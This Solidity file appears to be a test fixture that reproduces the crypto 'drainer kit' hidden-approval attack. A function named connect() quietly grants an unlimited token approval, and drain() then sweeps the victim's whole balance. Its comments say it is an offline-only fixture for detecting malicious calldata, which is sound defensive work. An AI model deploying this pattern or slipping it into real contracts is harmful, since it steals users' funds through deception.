// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title DrainerKitModule - minimized reproduction of the drainer-kit hidden-approval
///        pattern, for the malicious-calldata (b) real-class fixture.
/// @notice Reproduces the DOCUMENTED PATTERN (not a byte-replay of one tx): drainer kits
///         present a transaction under a benign label ("Connect", "Claim", "Enable") whose
///         real calldata hides an `approve` of the victim's assets to the attacker. Here a
///         benign-named `connect()` hides `approve(self, max)`; executed in the victim's
///         context (delegatecall "by the label"), it grants the kit a standing allowance
///         the attacker then `transferFrom`-sweeps. `self`/`asset` are set at construction
///         and read from this module's own code, so they resolve under delegatecall.
///         Provenance (arXiv 2409.02386 + drainer-kit analyses; class-level) in the sibling
///         PROVENANCE.md. Offline only - no network, no live RPC. Build/run in Docker.
contract DrainerKitModule {
    address public immutable self;
    address public immutable asset;

    constructor(address asset_) {
        self = address(this);
        asset = asset_;
    }

    /// @notice Benign name, hidden effect: approves the kit (`self`) over the caller's
    ///         asset. The presented intent is "connect/claim"; the real calldata is this.
    function connect() external {
        IERC20Min(asset).approve(self, type(uint256).max);
    }

    /// @notice Pulls the victim's full balance using the hidden approval.
    function drain(address victim) external returns (uint256 amount) {
        amount = IERC20Min(asset).balanceOf(victim);
        IERC20Min(asset).transferFrom(victim, self, amount);
    }
}
